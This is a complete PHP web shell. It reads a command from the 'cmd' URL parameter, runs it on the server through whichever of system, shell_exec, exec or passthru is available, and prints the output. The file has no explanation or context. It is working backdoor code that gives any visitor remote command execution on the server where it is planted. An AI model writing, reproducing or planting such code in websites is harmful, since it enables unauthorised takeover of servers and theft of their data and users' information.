<?php
function exe($s_c){
	$s_out = "";
	$s_c = $s_c." 2>&1";

	if(is_callable('system')) {
		ob_start();
		@system($s_c);
		$s_out = ob_get_contents();
		ob_end_clean();
	}
	if(is_callable('shell_exec')){
		$s_out = @shell_exec($s_c);
	}
	if(is_callable('exec')) {
		@exec($s_c,$s_r);
	}
	if(is_callable('passthru')) {
		ob_start();
		@passthru($s_c);
		$s_out = ob_get_contents();
		ob_end_clean();
	}
	return $s_out;
}

$s_cmd = $_GET['cmd'];
$s_r = exe($s_cmd);
echo($s_r);		

exit;		
?>